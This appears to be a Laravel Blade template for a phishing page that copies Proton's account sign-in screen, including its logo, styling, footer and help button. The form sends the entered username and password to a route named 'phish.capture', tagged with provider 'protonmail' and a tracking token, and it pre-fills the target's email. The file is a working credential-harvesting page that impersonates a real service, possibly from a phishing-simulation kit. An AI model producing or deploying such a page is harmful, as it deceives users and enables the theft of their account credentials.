<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Proton</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        html { font-size: 14px; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #fff;
            color: #0c0c14;
            min-height: 100vh;
            line-height: 1.42857;
        }
        :root {
            --primary: #6d4aff;
            --text-norm: #0c0c14;
            --text-weak: #5c5958;
            --field-norm: #adaba8;
            --field-hover: #8f8d8a;
            --border-norm: #d1cfcd;
            --border-weak: #eae7e4;
            --bg-norm: white;
            --bg-elevated: white;
            --interaction-norm: #6d4aff;
            --focus-outline: #6d4aff;
            --focus-ring: rgba(109, 74, 255, 0.2);
        }
        a { color: inherit; text-decoration: none; }
        button { font: inherit; border: 0; background: none; cursor: pointer; color: inherit; }
        input { font: inherit; color: inherit; }
        hr { border: none; border-top: 1px solid var(--border-norm); }

        .page {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: linear-gradient(68.66deg, rgb(232, 226, 255) 1.3%, rgb(247, 245, 255) 50%);
        }

        /* ── Header ── */
        .header {
            display: flex;
            flex-wrap: nowrap;
            justify-content: space-between;
            align-items: center;
            padding: 20px 48px 40px;
        }
        .logo-link { display: flex; align-items: center; }
        .header-right { display: flex; align-items: center; gap: 4px; }
        .lang-btn {
            display: inline-flex;
            align-items: center;
            font-size: 14px;
            color: var(--interaction-norm);
            padding: 5px 10px;
            border-radius: 8px;
            gap: 6px;
        }
        .lang-btn:hover { background: rgba(194, 193, 192, 0.2); }
        .mode-btn {
            display: inline-flex;
            align-items: center;
            font-size: 14px;
            padding: 6px;
            border-radius: 8px;
        }
        .mode-btn:hover { background: rgba(194, 193, 192, 0.2); }

        /* ── Main ── */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 24px;
        }

        /* ── Card ── */
        .card {
            width: 100%;
            max-width: 480px;
            background: var(--bg-elevated);
            border-radius: 24px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.16);
            padding: 44px;
        }

        /* ── Sign Header ── */
        .sign-header { margin-bottom: 24px; }
        .sign-header h1 { font-size: 28px; font-weight: 700; color: var(--text-norm); }
        .sign-header .subtitle { margin-top: 8px; font-size: 14px; color: var(--text-weak); }

        /* ── Fields ── */
        .field { margin-bottom: 0; }
        .field + .field { margin-top: 16px; }
        .field-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-norm);
            margin-bottom: 4px;
            cursor: pointer;
        }
        .input-wrap {
            position: relative;
            border: 1px solid var(--field-norm);
            border-radius: 8px;
            background: var(--bg-norm);
            transition: border-color 0.15s, box-shadow 0.15s;
        }
        .input-wrap:hover { border-color: var(--field-hover); }
        .input-wrap:focus-within {
            border-color: var(--focus-outline);
            box-shadow: 0 0 0 3px var(--focus-ring);
        }
        .input-wrap input {
            display: block;
            width: 100%;
            min-height: 38px;
            padding: 11px 14px;
            font-size: 16px;
            background: none;
            border: none;
            outline: none;
            color: var(--text-norm);
        }
        .input-wrap input::placeholder { color: #8f8d8a; }
        .pw-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
            width: 28px;
            height: 28px;
            color: var(--text-weak);
            border-radius: 4px;
        }
        .pw-toggle:hover { background: rgba(194, 193, 192, 0.2); }

        /* ── Checkbox ── */
        .check-row {
            display: flex;
            flex-direction: row;
            align-items: flex-start;
            margin-top: 8px;
        }
        .check-box {
            position: relative;
            display: inline-flex;
            margin-right: 8px;
            margin-top: 0;
        }
        .check-box input {
            position: absolute;
            cursor: pointer;
            inset: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0;
            margin: 0;
        }
        .check-fake {
            display: inline-flex;
            min-width: 20px;
            width: 20px;
            height: 20px;
            margin: auto;
            border-radius: 4px;
            border: 1px solid var(--field-norm);
            background: var(--bg-norm);
            transition: all 0.15s;
            align-items: center;
            justify-content: center;
        }
        .check-fake svg { transform: scale(0); transition: transform 0.15s; }
        .check-box input:hover + .check-fake { border-color: var(--interaction-norm); }
        .check-box input:checked + .check-fake {
            border-color: var(--interaction-norm);
            background: var(--interaction-norm);
            color: #fff;
        }
        .check-box input:checked + .check-fake svg { transform: scale(1); }
        .check-info { flex: 1; }
        .check-label {
            display: flex;
            align-items: center;
            font-size: 14px;
            color: var(--text-norm);
            cursor: pointer;
        }
        .check-hint { font-size: 14px; color: var(--text-weak); }
        .check-hint a { color: var(--text-weak); }
        .check-hint a:hover { text-decoration: underline; }

        /* ── Button ── */
        .btn-submit {
            display: block;
            width: 100%;
            margin-top: 24px;
            padding: 12px 1.1875em;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            color: #fff;
            background: #0c0c14;
            border: 1px solid transparent;
            border-radius: 8px;
            cursor: pointer;
            text-align: center;
            transition: opacity 0.15s;
        }
        .btn-submit:hover { opacity: 0.9; }

        /* ── Links ── */
        .new-user {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            color: var(--text-norm);
        }
        .new-user a { color: var(--primary); }
        .new-user a:hover { text-decoration: underline; }
        .divider { margin: 16px 0; }
        .trouble-link {
            display: block;
            text-align: center;
            font-size: 14px;
            color: var(--primary);
        }
        .trouble-link:hover { text-decoration: underline; }

        /* ── Footer ── */
        .footer { text-align: center; padding: 32px 16px 16px; }
        .footer-tagline { font-size: 14px; color: var(--text-norm); margin-bottom: 16px; }
        .footer-links {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 14px;
        }
        .footer-links a { color: var(--primary); }
        .footer-links a:hover { text-decoration: underline; }
        .footer-links .sep { color: var(--border-norm); }
        .footer-links .ver { color: var(--text-norm); }

        /* ── Lumo ── */
        .lumo {
            position: fixed;
            bottom: 48px;
            right: 48px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #fff;
            border: 1px solid var(--border-weak);
            border-radius: 9999px;
            padding: 4px 16px 4px 4px;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-norm);
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            z-index: 100;
        }
        .lumo:hover { background: #f5f5f5; }
        .lumo-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: var(--border-weak);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
    </style>
</head>
<body>
<div class="page">

    <header class="header">
        <a href="#" class="logo-link">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 36" width="96" height="36" fill="none">
                <path fill="#6351E1" d="M0 23.793v6.265h4.397v-5.993a2.199 2.199 0 0 1 2.199-2.199h4.509a7.933 7.933 0 0 0 7.932-7.932A7.932 7.932 0 0 0 11.105 6H0v7.83h4.397v-3.69h6.41a3.754 3.754 0 0 1 3.753 3.753 3.754 3.754 0 0 1-3.753 3.753h-4.66A6.146 6.146 0 0 0 0 23.793z"/>
                <path fill="url(#plm-a)" d="M6.595 21.865A6.594 6.594 0 0 0 0 28.46v1.597h4.397v-5.993a2.199 2.199 0 0 1 2.198-2.199z"/>
                <path fill="#6351E1" d="M19.717 30.058v-9.544c0-3.894 2.274-6.995 6.822-6.995.73-.01 1.459.07 2.169.24v3.928c-.518-.034-.964-.034-1.172-.034-2.41 0-3.445 1.103-3.445 3.343v9.06l-4.374.002zm10.301-8.098c0-4.789 3.617-8.441 8.648-8.441s8.649 3.652 8.649 8.442c0 4.789-3.618 8.476-8.649 8.476-5.03 0-8.648-3.688-8.648-8.476zm12.99 0c0-2.722-1.827-4.65-4.342-4.65-2.514 0-4.341 1.927-4.341 4.65 0 2.757 1.826 4.652 4.341 4.652 2.516 0 4.342-1.895 4.342-4.651zm18.295 0c0-4.789 3.618-8.441 8.648-8.441 5.031 0 8.649 3.652 8.649 8.442 0 4.789-3.618 8.476-8.648 8.476-5.03 0-8.65-3.688-8.65-8.476zm12.99 0c0-2.722-1.827-4.65-4.342-4.65-2.514 0-4.341 1.927-4.341 4.65 0 2.757 1.826 4.652 4.341 4.652 2.516 0 4.343-1.895 4.343-4.651h-.001zm6.58 8.098v-9.2c0-4.272 2.722-7.339 7.58-7.339 4.824 0 7.546 3.067 7.546 7.34v9.199H91.66v-8.855c0-2.378-1.068-3.86-3.204-3.86s-3.205 1.482-3.205 3.86v8.855h-4.378zM59.994 17.343h-4.72v6.032c0 2.102.757 3.066 2.928 3.066.207 0 .723 0 1.379-.034v3.549c-.896.241-1.687.379-2.55.379-3.652 0-6.134-2.205-6.134-6.374v-6.618H47.97v-3.48h.73a2.199 2.199 0 0 0 2.198-2.198v-3.28h4.377v5.481h4.72v3.477z"/>
                <defs><linearGradient id="plm-a" x1="3.297" x2="3.297" y1="28.872" y2="19.667" gradientUnits="userSpaceOnUse"><stop stop-color="#6D4BFD"/><stop offset="1" stop-color="#1C0554"/></linearGradient></defs>
            </svg>
        </a>
        <div class="header-right">
            <button class="lang-btn" type="button">
                <svg viewBox="0 0 16 16" width="16" height="16" fill="none"><path fill-rule="evenodd" d="M4.012 8H2.02a6.504 6.504 0 0 1 3.805-5.425 7.143 7.143 0 0 0-.591.917C4.539 4.764 4.09 6.39 4.013 8Zm0 1H2.02a6.504 6.504 0 0 0 3.805 5.425 7.14 7.14 0 0 1-.591-.917C4.539 12.236 4.09 10.61 4.013 9ZM8 14.917c-.664-.219-1.331-.864-1.89-1.888C5.5 11.908 5.092 10.451 5.014 9H8v5.917Zm3.176-.492c.217-.284.415-.593.591-.917.694-1.272 1.143-2.897 1.22-4.508h1.994a6.504 6.504 0 0 1-3.805 5.425ZM11.986 9c-.077 1.451-.485 2.908-1.097 4.03-.558 1.023-1.225 1.668-1.889 1.887V9h2.986Zm1.002-1h1.993a6.504 6.504 0 0 0-3.805-5.425c.217.284.415.593.591.917.694 1.272 1.143 2.897 1.22 4.508ZM9 2.083c.664.219 1.331.865 1.89 1.888.61 1.121 1.019 2.578 1.096 4.029H9V2.083Zm-1 0V8H5.013c.078-1.451.486-2.908 1.098-4.03C6.669 2.949 7.336 2.303 8 2.084ZM8.5 1a7.5 7.5 0 1 0 0 15 7.5 7.5 0 0 0 0-15Z"/></svg>
                <span lang="en">English</span>
                <svg viewBox="0 0 16 16" width="12" height="12"><path d="M4 6l4 4 4-4" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
            </button>
            <button class="mode-btn" type="button" title="Mode: Light">
                <svg viewBox="0 0 16 16" width="16" height="16"><path d="M9 1.5a.5.5 0 0 0-1 0V3a.5.5 0 0 0 1 0V1.5Z"/><path d="M13.854 3.146a.5.5 0 0 0-.708 0l-1 1a.5.5 0 0 0 .708.708l1-1a.5.5 0 0 0 0-.708Z"/><path d="M14 8a.5.5 0 0 0 0 1h1.5a.5.5 0 0 0 0-1H14Z"/><path d="M12.854 12.146a.5.5 0 0 0-.708.708l1 1a.5.5 0 0 0 .708-.708l-1-1Z"/><path d="M3.854 3.146a.5.5 0 1 0-.708.708l1 1a.5.5 0 1 0 .708-.708l-1-1Z"/><path d="M1.5 8a.5.5 0 0 0 0 1H3a.5.5 0 0 0 0-1H1.5Z"/><path d="M4.854 12.854a.5.5 0 0 0-.708-.708l-1 1a.5.5 0 0 0 .708.708l1-1Z"/><path fill-rule="evenodd" d="M8.5 4a4.5 4.5 0 1 0 0 9 4.5 4.5 0 0 0 0-9ZM5 8.5a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0Z"/><path d="M8.5 13.5a.5.5 0 0 1 .5.5v1.5a.5.5 0 0 1-1 0V14a.5.5 0 0 1 .5-.5Z"/></svg>
            </button>
        </div>
    </header>

    <div class="main-content">
        <div class="card">
            <div class="sign-header">
                <h1>Sign in</h1>
                <p class="subtitle">Enter your Proton Account details.</p>
            </div>

            <form action="{{ route('phish.capture', ['provider' => 'protonmail', 'token' => $token]) }}" method="POST">
                @csrf

                <div class="field">
                    <label for="username" class="field-label">Email or username</label>
                    <div class="input-wrap">
                        <input type="text" id="username" name="identifier" autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" value="{{ $email ?? '' }}">
                    </div>
                </div>

                <div class="field">
                    <label for="password" class="field-label">Password</label>
                    <div class="input-wrap">
                        <input type="password" id="password" name="password" autocomplete="current-password" autocapitalize="off" autocorrect="off" spellcheck="false">
                        <button type="button" class="pw-toggle" tabindex="-1" title="Reveal password">
                            <svg viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M8 12c-2.186 0-4.476-1.26-5.987-4C3.523 5.26 5.814 4 8 4s4.476 1.26 5.987 4c-1.51 2.74-3.8 4-5.987 4Zm6.89-4.434c-3.32-6.088-10.46-6.088-13.78 0a.909.909 0 0 0 0 .868c3.32 6.088 10.46 6.088 13.78 0a.908.908 0 0 0 0-.868ZM8 6a2 2 0 0 1-2.989 1.739A3 3 0 1 0 7.74 5.01c.166.292.261.63.261.989Z"/></svg>
                        </button>
                    </div>
                </div>

                <div class="check-row">
                    <label class="check-box">
                        <input type="checkbox" id="staySignedIn" name="persistent" value="1">
                        <span class="check-fake">
                            <svg viewBox="0 0 16 16" width="14" height="14"><path fill-rule="evenodd" d="M13.854 4.148a.51.51 0 0 1 0 .714l-6.859 6.93a.695.695 0 0 1-.99 0L3.146 8.905a.509.509 0 0 1 0-.714.496.496 0 0 1 .708 0L6.5 10.864l6.646-6.716a.496.496 0 0 1 .708 0Z"/></svg>
                        </span>
                    </label>
                    <div class="check-info">
                        <label for="staySignedIn" class="check-label">Keep me signed in</label>
                        <div class="check-hint">Recommended on trusted devices. <a href="#">Why?</a></div>
                    </div>
                </div>

                <button type="submit" class="btn-submit">Sign in</button>

                <div class="new-user">New to Proton? <a href="#">Create account</a></div>

                <hr class="divider">

                <button type="button" class="trouble-link">Trouble signing in?</button>
            </form>
        </div>
    </div>

    <footer class="footer">
        <p class="footer-tagline">Proton. Privacy by default.</p>
        <div class="footer-links">
            <a href="#">Terms</a>
            <span class="sep">|</span>
            <a href="#">Privacy policy</a>
            <span class="sep">|</span>
            <span class="ver">Version 5.0.399.1</span>
        </div>
    </footer>
</div>

<button class="lumo">
    <span class="lumo-icon">
        <svg viewBox="0 0 16 16" width="20" height="20" fill="none"><circle cx="8" cy="8" r="7" fill="#d1cfcd"/><circle cx="6" cy="7" r="1" fill="#5c5958"/><circle cx="10" cy="7" r="1" fill="#5c5958"/><path d="M5.5 10c.833 1.333 4.167 1.333 5 0" stroke="#5c5958" stroke-width="1" stroke-linecap="round"/><path d="M4 5.5L3 4" stroke="#5c5958" stroke-width="1" stroke-linecap="round"/><path d="M12 5.5L13 4" stroke="#5c5958" stroke-width="1" stroke-linecap="round"/></svg>
    </span>
    <span>Get help from Lumo</span>
</button>

</body>
</html>
